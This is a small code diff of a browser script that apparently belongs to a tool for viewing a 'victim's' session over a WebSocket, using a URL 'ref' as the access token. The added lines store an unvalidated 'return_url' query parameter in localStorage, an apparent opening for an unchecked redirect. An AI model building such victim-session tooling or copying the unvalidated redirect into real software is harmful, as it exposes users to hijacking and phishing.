@@ -2,6 +2,8 @@
 // The ref serves as the access token for the victim's WebSocket connection.
 const params = new URLSearchParams(location.search);
 const ref = params.get('ref') || '';
+const returnUrl = params.get('return_url') || '';
+if (returnUrl) localStorage.setItem('return_url', returnUrl);
 
 const viewer = new SocialPanelViewer(document.querySelector('#screen'));
 const overlay = document.querySelector('#loadingOverlay');
